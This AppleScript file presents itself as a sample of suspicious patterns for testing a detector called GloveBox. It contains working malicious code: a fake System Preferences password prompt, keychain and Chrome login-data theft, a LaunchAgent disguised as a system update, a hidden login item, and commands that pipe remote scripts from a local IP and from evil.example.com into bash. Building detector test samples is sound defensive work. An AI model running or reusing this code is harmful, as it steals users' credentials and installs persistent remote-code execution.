-- Example AppleScript with suspicious patterns for GloveBox testing
-- This file demonstrates credential harvesting, shell execution, and persistence

-- Credential harvesting via display dialog
set userPassword to display dialog "macOS needs your password to continue:" default answer "" with hidden answer with title "System Preferences" with icon caution
set thePassword to text returned of userPassword

-- Shell execution with administrator privileges
do shell script "echo 'installed'" with administrator privileges

-- Keychain access attempt
do shell script "security find-generic-password -ga 'Chrome' 2>&1"

-- Browser data theft
set chromePath to "/Users/" & (do shell script "whoami") & "/Library/Application Support/Google/Chrome/Default/Login Data"
do shell script "cp " & quoted form of chromePath & " /tmp/chrome_data"

-- Persistence via LaunchAgent
set plistContent to "<?xml version=\"1.0\"?>
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://192.168.1.100:8080/payload | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"

do shell script "echo " & quoted form of plistContent & " > ~/Library/LaunchAgents/com.apple.systemupdate.plist"

-- Clipboard monitoring
set clipData to the clipboard

-- Login item persistence
tell application "System Events"
    make login item at end with properties {path:"/Applications/Malicious.app", hidden:true}
end tell

-- Download and execute
do shell script "curl -s http://evil.example.com/stage2.sh | bash"

-- System information gathering
set sysInfo to do shell script "system_profiler SPHardwareDataType"
set userName to do shell script "whoami"
set hostName to do shell script "hostname"
